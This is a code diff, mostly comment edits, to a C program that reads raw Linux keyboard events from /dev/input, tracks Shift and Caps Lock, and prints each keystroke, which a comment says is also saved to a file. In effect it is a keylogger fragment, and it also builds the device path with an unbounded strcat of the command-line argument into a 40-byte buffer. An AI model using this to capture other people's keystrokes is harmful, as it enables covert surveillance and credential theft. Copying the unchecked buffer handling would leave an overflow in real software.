@@ -187,14 +187,14 @@ static void print_code(int code, bool uppercase) {
 
 int main(int argc, char *argv[]) {
 
-  	// Open keyboard file input stream
-	char* inputPath = "/dev/input/event"; // Todo: Handle /dev/input/eventX dynamically
+  // Grab cmd arg for input event path. Ex: /dev/input/event0
+	char* inputPath = "/dev/input/event";
 	char keyboard[40];
 
 	strcpy(keyboard, inputPath);
 	strcat(keyboard, argv[1]);
-	printf("Keyboard path: %s\n", keyboard);
 
+  // Open keyboard file input stream
 	FILE* f = fopen(keyboard, "r");
 	if (f == NULL) {
 		perror("Keyboard input device not found");
@@ -216,16 +216,16 @@ int main(int argc, char *argv[]) {
 	// Create a listener to the input stream
 	while (1) {
 
-    		// Read byte stream from input event
+    // Read byte stream from input event
 		size_t readbyte = read(fd, evt, sizeof(evt));
 
-   		// Check for incorrect reads
+   	// Check for incorrect reads
 		if (readbyte < (int) sizeof(struct input_event)) {
 			perror("Input too short to read");
 			return 1;
 		}
 
-    		// Loop over the input event per byte size
+    // Loop over the input event per byte size
 		for(int i = 0; i < (int) (readbyte / sizeof(struct input_event)); i++) {
 			if (EV_KEY == evt[i].type) {
         
@@ -236,10 +236,9 @@ int main(int argc, char *argv[]) {
 				// Set a boolean variable for caplocks key to true if it is pressed
 				// XOR the value of capslock and shift to determine upper or lowercase
 		
-				// Essentially skips the events fired before and after a key press
-        			// this way only the pressed key value is shown
 				
-				// Handle shift key event
+				
+				// Handle shift key event, determine if shift key is being held
 				if ( (evt[i].code == KEY_RIGHTSHIFT || evt[i].code == KEY_LEFTSHIFT)) {
 					if(!shiftHeld){
 						shiftHeld = true;
@@ -249,11 +248,14 @@ int main(int argc, char *argv[]) {
 					shiftHeld = false;
 				}	
 
+        // Essentially skips the events fired before and after a key press
+        // this way only the pressed key value is shown
 				if ((evt[i].value == KEY_IS_PRESSED) || (evt[i].value == KEY_KEEPING_PRESSED)) {
+          // Toggle case if capslock is pressed
 					if(evt[i].code == KEY_CAPSLOCK) {
 						uppercase = !uppercase;
 					} else {
-						print_code(evt[i].code, uppercase);
+						print_code(evt[i].code, uppercase); // Print key pressed and save to file
 					}
 				}
 			}
